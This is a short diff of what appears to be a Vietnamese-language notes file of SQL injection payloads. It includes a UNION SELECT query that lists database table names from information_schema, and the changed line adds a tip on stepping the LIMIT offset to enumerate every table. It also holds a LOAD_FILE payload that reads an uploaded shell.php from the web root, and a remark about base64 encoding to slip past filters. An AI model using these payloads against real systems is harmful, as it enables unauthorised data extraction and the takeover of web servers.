@@ -21,7 +21,7 @@ có thể encode base64 tránh filter
 
 ------- tên cột -------
 99999' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1 -- 
-(1 column)
+(1 column) đổi 0,1 1,1 2,1 để list các tên bảng 
 
 ------- đọc file ------
 99999' UNION SELECT LOAD_FILE('/var/www/html/uploads/shell.php') --
